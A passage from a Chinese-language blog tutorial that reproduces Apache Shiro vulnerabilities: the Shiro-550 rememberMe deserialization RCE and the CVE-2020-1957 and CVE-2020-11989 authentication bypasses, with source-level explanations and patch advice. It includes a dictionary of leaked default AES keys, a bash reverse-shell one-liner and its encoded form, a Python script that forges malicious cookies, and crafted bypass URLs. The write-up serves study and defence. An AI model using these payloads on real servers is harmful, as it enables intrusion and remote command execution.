class="line">随后在服务器端会相反的进行base64解码=&gt;AES解密=&gt;反序列化</span><br><span class="line">AES加密为对称加密，加密解密需要同一个密钥，重点就是AES密钥的获取</span><br><span class="line">其中1.2.4默认密钥kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>在这个过程中，我们发现AES密钥非常关键，但密钥被硬编码到了代码中，也就是说加密密钥Key编码在源码内。只要可以拿到源代码就可以拿到这个Key，只要得到默认的key，就可以被利用构造任意cookie，从而进行shiro的反序列化攻击。但是在Shiro1.2.5以上，官方已经修复了这个漏洞，已经拿不到KEY了。因此，在得到key的情况下攻击者可以构造一个恶意对象，并且进行序列化=&gt;AES加密=&gt;base64编码后，作为cookie中rememberMe字段进行发送，Shiro将收到的rememberMe字段进行base64解码=&gt;AES解密=&gt;反序列化后，最终执行了一个恶意代码指令，在目标服务器上执行任意命令造成反序列化RCE漏洞。注意，前提是需要有合法用户，为什么需要RememberMecookie是因为Shiro会先获取用户信息，当存在有效的用户信息时才会进入下一阶段的流程。<br>通过上面的知识知道要利用这个漏洞必须构造出一个可以让服务器反序列化的恶意对象。</p><ul><li>影响版本ApacheShiro&lt;=1.2.4</li><li> <strong>漏洞利用条件</strong>：</li><li>已知ShiroAES解密密钥。</li><li>开启RememberMe功能。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">一些收集到的key字典:</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA==</span><br><span class="line">fCq+/xW488hMTCD+cmJ3aQ==</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">1QWLxg+NYmxraMoxAXu/Iw==</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag==</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg==</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA==</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">OUHYQzxQ/W9e/UjiAGu6rg==</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA==</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ==</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA==</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ==</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA==</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ==</span><br><span class="line">wGiHplamyXlVB11UXWol8g==</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA==</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg==</span><br><span class="line">L7RioUULEFhRyxM7a2R/Yg==</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ==</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw==</span><br><span class="line">OY//C4rhfwNxCQAQCrQQ1Q==</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ==</span><br><span class="line">f/SY5TIve5WWzT4aQlABJA==</span><br><span class="line">bya2HkYo57u6fWh5theAWw==</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg==</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg==</span><br><span class="line">ZWvohmPdUsAWT3=KpPqda</span><br><span class="line">YI1+nBV//m7ELrIyDHm6DQ==</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA==</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag==</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA==</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA==</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw==</span><br><span class="line">fsHspZw/92PrS3XrPW+vxw==</span><br><span class="line">XTx6CKLo/SdSgub+OPHSrw==</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ==</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ==</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw==</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ==</span><br><span class="line">Y1JxNSPXVwMkyvES/kJGeQ==</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig==</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg==</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw==</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ==</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg==</span><br><span class="line">Bf7MfkNR0axGGptozrebag==</span><br><span class="line">1tC/xrDYs8ey+sa3emtiYw==</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw==</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA==</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ==</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q==</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA==</span><br><span class="line">2itfW92XazYRi5ltW0M2yA==</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw==</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag==</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag==</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag==</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg==</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg==</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ==</span><br><span class="line">yNeUgSzL/CfiWw1GALg6Ag==</span><br><span class="line">NGk/3cQ6F5/UNPRh8LpMIg==</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg==</span><br><span class="line">CrownKey==a12d/dakdad</span><br><span class="line">empodDEyMwAAAAAAAAAAAA==</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw==</span><br><span class="line">YTM0NZomIzI2OTsmIzM0NTueYQ==</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA==</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw==</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA==</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA==</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw==</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA==</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA==</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA==</span><br><span class="line">Z3h6eWd4enklMjElMjElMjE=</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ==</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag==</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q==</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA==</span><br><span class="line">GAevYnznvgNCURavBhCr1w==</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg==</span><br><span class="line">SDKOLKn2J1j/2BHjeZwAoQ==</span><br></pre></td></tr></table></figure><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>输入正确的账号密码，并选择“记住我”</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B04.png"></p><p>使用bp抓取数据包，查看包内容，可以看到cookie里的rememberme</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B03.png"></p><p>使用nc监听本地的1234端口，最终shell会反弹到这个端口</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B05.png"></p><p>编码一下反弹shell的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-i&gt;&amp;/dev/tcp/192.168.1.6/12340&gt;&amp;1</span><br><span class="line"></span><br><span class="line">-i参数生成交互式shell</span><br><span class="line">&gt;&amp;把标准输入和标准输出重定向到socket</span><br><span class="line">/dev/tcp/192.168.1.6/1234表示bash会对/dev/tcp特殊处理，代表了一个tcpsocket</span><br><span class="line">0&gt;&amp;1将标准输入重定向到标准输出</span><br><span class="line">编码后：bash-c&#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>注：为什么要对反弹shell进行编码？<br>在exec()函数中，”&gt;”管道符是没有意义的，会被解析为其他的意义，而我们的反弹shell命令中又必须使用，所以需要编码。<br>另外，StringTokenizer类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。诸如此类的东西ls”MyDirectory”将被解释为ls’”My’’Directory”‘，空格会失效</p><p>使用ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B02.png"></p><p>使用py脚本生成rememberMe值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shiro.py</span></span><br><span class="line">importsys</span><br><span class="line">importuuid</span><br><span class="line">importbase64</span><br><span class="line">importsubprocess</span><br><span class="line">fromCrypto.CipherimportAES</span><br><span class="line">defencode_rememberme(command):</span><br><span class="line">popen=subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,<span class="string">&#x27;ysoserial-sleep.jar&#x27;</span>,<span class="string">&#x27;JRMPClient&#x27;</span>,command],stdout=subprocess.PIPE)</span><br><span class="line">BS=AES.block_size</span><br><span class="line">pad=lambdas:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">key=base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)//已知的key</span><br><span class="line">iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">file_body=pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext=base64.b64encode(iv+encryptor.encrypt(file_body))</span><br><span class="line">returnbase64_ciphertext</span><br><span class="line">if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload=encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B01.png"></p><p>将生成的rememberMe值替换原来的值，放包即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B0.png"></p><p>反弹shell成功</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><h3 id="CVE-2020-1957-Apacheshiro-lt-1-5-2权限绕过漏洞"><a href="#CVE-2020-1957-Apacheshiro-lt-1-5-2权限绕过漏洞" class="headerlink" title="(CVE-2020-1957)Apacheshiro&lt;1.5.2权限绕过漏洞"></a>(CVE-2020-1957)Apacheshiro&lt;1.5.2权限绕过漏洞</h3><p>在SpringBoot中使用ApacheShiro进行身份验证、权限控制时，攻击者构造一个特殊的http请求，利用ApacheShiro拦截器和SpringBoot对URL(requestURI)的处理的差异化，可以绕过ApacheShiro对SpringBoot中的Servlet的权限控制，绕过Shiro的认证，可以未授权访问敏感路径。</p><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有<strong>anon</strong>，<strong>authc</strong>等拦截器。</p><ul><li>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</li><li>authc为登录拦截器，一般是需要登录认证才能访问的资源。</li></ul><p>用户可以在Shiro.ini编写匹配URL配置，对匹配的URL将进行拦截检查，这样就能实现对URL的访问控制，提高资源访问的安全性。例如，访问/index.html主页的时候，Shiro将不会对其进行登录判断，因为这是一个需要让访问者能够访问的静态页面，交给anon拦截器处理，此项资源不需要登录就能进行访问。而对于/user/1，/user/2，/user/3，/admin/*等资源接口，authc拦截器将会对其进行登录判断，只有登录认证才能访问资源，目的是保证操作的合法性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在shiro.ini配置文件中，可以这样配置：</span><br><span class="line">[urls]</span><br><span class="line">/index.html = anon</span><br><span class="line">/user/** = authc</span><br><span class="line">/admin/** = authc</span><br><span class="line">知识补充：</span><br><span class="line">Shiro的URL路径表达式为ANT格式，路径通配符支持?，*，**</span><br><span class="line">?：代表匹配一个字符</span><br><span class="line">*：代表匹配零个或多个字符串</span><br><span class="line">**：代表匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure><p>其中<code>*</code>表示匹配零个或多个字符串，<code>/*</code>可以匹配<code>/hello</code>，但匹配不到<code>/hello/</code>因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>将会被进行权限判断，如果请求的URI为<code>/hello/</code>呢，<code>/*</code>URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中<code>/hello</code>形式和<code>/hello/</code>形式的URL访问的资源是一样的。</p><table><thead><tr><th>URL路径</th><th align="center">说明</th></tr></thead><tbody><tr><td><code>/app/*.x</code></td><td align="center">匹配(Matches)所有在app路径下的.x文件</td></tr><tr><td><code>/app/p?ttern</code></td><td align="center">匹配(Matches)/app/pattern和/app/pXttern,但是不包括/app/pttern</td></tr><tr><td><code>/**/example</code></td><td align="center">匹配(Matches)/app/example,/app/foo/example,和/example</td></tr><tr><td><code>/app/**/dir/file.*</code></td><td align="center">匹配(Matches)/app/dir/file.jsp,/app/foo/dir/file.html,/app/foo/bar/dir/file.pdf,和/app/dir/file.java</td></tr><tr><td><code>/**/*.jsp</code></td><td align="center">匹配(Matches)任何的.jsp文件</td></tr></tbody></table><p>属性：<br>最长匹配原则(hasmorecharacters)<br>说明，URL请求<code>/app/dir/file.jsp</code>，现在存在两个路径匹配模式<code>/**/*.jsp和/app/dir/*.jsp</code>，那么会根据模式<code>/app/dir/*.jsp</code>来匹配</p><h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><h4 id="shiro-lt-1-5-0版本权限绕过"><a href="#shiro-lt-1-5-0版本权限绕过" class="headerlink" title="shiro&lt;1.5.0版本权限绕过"></a>shiro&lt;1.5.0版本权限绕过</h4><p>环境：<a href="https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic">https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic</a><br>将源码导入javaIDEA中</p><p>首先在pom.xml文件可以看到shiro的版本，把版本修改成1.5.0以下，也可以不修改。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-9.png"></p><p>来到main目录下ShiroConfig.java文件进行修改，将原来的拦截正则修改，添加authc的拦截正则。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;/hello/*&quot;</span>,<span class="string">&quot;authc&quot;</span>);<span class="comment">//访问/hello及以下目录都将由authc进行校验</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-5.png"></p><p>来到LoginController.java文件，在这里修改路由控制器方法，我们选择添加一个方法，同时需要刷新一下Maven。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">importorg.springframework.web.bind.annotation.PathVariable;<span class="comment">//引入方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法的具体实现</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/hello/&#123;currentPage&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">publicStringhello(<span class="meta">@PathVariableIntegercurrentPage</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span><span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//访问成功后返回hello资源内容</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-4.png"></p><p>运行ShiroBasicApplication.java文件<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-6.png"></p><p>访问<a href="http://your-ip:8080/login%EF%BC%8C%E6%98%BE%E7%A4%BA%E6%8F%90%E7%A4%BA%E7%99%BB%E5%BD%95">http://your-ip:8080/login，显示提示登录</a><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-7.png"></p><p>抓包重放查看<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-1.png"></p><p>现在修改请求的URL，尝试正常访问需要鉴权的资源，显示是无法访问的<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-2.png"></p><p>那么我们构造一下，在该资源的URL尾部添加<code>/</code><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-3.png"><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-8.png"></p><p>资源已经能够正常访问了，绕过了shiro的验证<br>当我们通过<strong>敏感路径扫描</strong>后，获取到无权限访问的敏感路径，再构造这样的路径末尾携带<code>/</code>URL将造成未授权访问。</p><p><strong>源码理解</strong></p><p>我们输入的URL首先进入org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver的getChain方法中，被获取请求uri路径，随后触发pathMatches方法进行下一步匹配<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-10.png"></p><p>pathPattern=/hello/*,requestURI=/hello/1/</p><p>后面最终会调用core.src.main.java.org.apache.shiro.util.AntPathMatcher类中的doMatch方法进行传入的requestURI与拦截器表达式进行匹配</p><p>但是，在上面已经提到<code>*</code>表示匹配零个或多个字符串，<code>/*</code>可以匹配<code>/hello</code>，但匹配不到<code>/hello/</code>因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>将会被进行权限判断，如果请求的URI为<code>/hello/</code>呢，<code>/*</code>URL路径表达式将无法正确匹配，放行。所以如果Shiro拦截器表达式不以<code>/</code>结尾，且requestURI以<code>/</code>结尾，判断代码将返回false表示匹配失败，从而绕过Shiro认证。随后进入web框架的spring验证。</p><p>而spring的拦截器在在检测拦截器表达式与requestURI结尾是否为<code>/</code>之后，并没有直接返回false。而是将拦截器表达式结尾添加<code>/</code>，这时拦截器表达式就和我们构造的URL请求一致，所以spring显示匹配成功返回true，放行。</p><p>准确来说该身份验证绕过漏洞是spring＋shiro组合的漏洞，构造的请求要绕过shiro拦截器，还要绕过spring拦截器。但是这个漏洞在shiro-1.5.0版本中被修复了</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><h4 id="shiro-lt-1-5-2版本权限绕过"><a href="#shiro-lt-1-5-2版本权限绕过" class="headerlink" title="shiro&lt;1.5.2版本权限绕过"></a>shiro&lt;1.5.2版本权限绕过</h4><p>上面提到shiro-1.5.0的修复，其实在1.5.2以前的版本验证方式都差不多，所以归类为&lt;1.5.2的漏洞。<br>1.5.0的修复后效果：代码修复方式是通过判断requestURI是否以<code>/</code>为结尾，如果以/结尾的话，则去掉尾部的<code>/</code>符号再与shiro拦截器表达式进行比较。<br>当requestURI为<code>/hello/1/</code>等以<code>/</code>为结尾的URI的时候，都会被清除最后的<code>/</code>号，再进行URL路径匹配。</p><p><strong>简单说一下本此版本的漏洞形成原因：</strong><br>Shiro1.5.0-1.5.1版本在对requestURI的处理是这样的，以分号将传入的URI进行截断，并将分号以及分号后面的数据进行清空，返回分号前面的URI数据，从而让<code>/abc/..;/admin/</code>变为<code>/abc/..</code>，因为不存在<code>/admin/**</code>所以绕过shiro检验进入spring检验。</p><p>但是，Spring对分号处理的方式与Shiro不同，Spring会先获取分号的位置，并检测分号后是否存在<code>/</code>，如果有，将<code>/</code>的位置记录在slashIndex变量中，并将分号前的数据与<code>/</code>之后的数据进行拼接，从而让<code>/abc/..;/admin/</code>变为<code>/abc/../admin/</code>。随后处理，取有效正常路径等待，然后返回处理后的requestURI（此时为<code>/admin/</code>）进行匹配，放行，访问成功。</p><p>同样还是利用了spring+shiro组合中，两者对URL处理方式不同来实现绕过。</p><p>在后来的Shiro1.5.2版本中，在进行decodeAndCleanUriString方法之前会先进行URI解析，调用request.getServletPath()和request.getPathInfo()获取ServletPath和PathInfo并进行路径拼接，避开了spring的decodeAndCleanUriString对于分号的处理，从而修复了此漏洞。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​       </p><h3 id="CVE-2020-11989-Apacheshiro-lt-1-5-3权限绕过漏洞"><a href="#CVE-2020-11989-Apacheshiro-lt-1-5-3权限绕过漏洞" class="headerlink" title="(CVE-2020-11989)Apacheshiro&lt;1.5.3权限绕过漏洞"></a>(CVE-2020-11989)Apacheshiro&lt;1.5.3权限绕过漏洞</h3><p>此漏洞和CVE-2020-1957类似，都是因为shiro和spring对URL的处理不一致导致的。但是要求对admin资源的匹配符号为<code>*</code>不能是<code>**</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试项目部署于Tomcat。该漏洞成功利用存在下面两个条件：</p><ol><li>项目不能部署在根目录，也就是需要 context-path，设置server.servlet.context-path=/app，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。</li><li>Spring控制器中没有另外的权限校验代码</li></ol><p><strong>简单解释漏洞****：</strong></p><p>首先有两种攻击方式：</p><p><strong>第一种</strong><br>获取到无权限访问的敏感路径，在authc认证路径后添加<code>%25%32%66</code>（就是将<code>/</code>进行两次URL编码）进行身份验证绕过。</p><p><strong>第二种</strong><br>获取到无权限访问的敏感路径，在路径的头部添加<code>/;/</code>进行身份验证绕过。</p><ul><li><p>在Shiro1.5.2版本中，对于requestURI处理的方式存在一些不同，对URL进行两次解码，此处也是漏洞触发点所在。Shiro1.5.2使用的是request.getContextPath()，request.getServletPath()，request.getPathInfo()拼接的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.getRequestURL()：返回全路径；</span><br><span class="line">request.getRequestURI()：返回除去Host部分的路径；</span><br><span class="line">request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空；</span><br><span class="line">request.getServletPath()：返回除去Host和工程名部分的路径；</span><br><span class="line">request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</span><br></pre></td></tr></table></figure><p>假设我们构造URL为/admin/a%25%32%66a由于getServletPath()方法会对requestURI进行一次url解码，在之后的decodeAndCleanUriString方法中进行第二次url解码，所以shiro检测的是/admin/a/a,不在匹配范围内，放行进入到spring boot 。Spring是怎么对其进行解析的，在org.s-pringframework.web.uti.UrlPathHelper#getPathWithinApplication中，将url解析为/toJsonList/a%2fa，还没解码完的URL被当做{name}了，这样其实就表示/admin/{name}中的name值为a%2fa，符合匹配规则，放行。<br>解释一下就是<code>/**</code> 之类的路径匹配配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：/admin/** 可以匹配 /admin/a 或者 /admin/b/c/d 等请求。</p><p>对于<code>/*</code>的话 ，单个不能跨目录，只能在两个/之间匹配任意数量的字符，如/admin/* 可以匹配 /admin/a 但是不能匹配 /admin/b/c/d。</p><p>所以如果我们将其配置为/admin/*，但是我们访问形如admin/a/b这种路径，此时就会绕过访问权限。</p></li><li><p>我们访问 /;/app/admin/1，最终将成功访问到/app/admin/1这个需要验证身份的资源。利用CVE-2020-1957漏洞原理，shiro以分号截断，所以会将<code>/</code>拿去检验，放行，进入spring，而spring则会截断reqeustURI中分号后的数据，并返回，最终变成选取正确访问路径访问</p><p>当 URL 进入到 Tomcat 时， Tomcat 判断 /;/app/admin/1 为 app 下的 /admin/page  路由，进入到 Shiro 时被 ; 截断被认作为 / ，不再检验,再进入 Spring 时又被正确处理为正常路径app下的 /admin/1  路由，最后导致 Shiro 的权限绕过。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p></li></ul><p>​        </p><h3 id="CVE-2020-13933-Apacheshiro-lt-1-6-0权限绕过漏洞"><a href="#CVE-2020-13933-Apacheshiro-lt-1-6-0权限绕过漏洞" 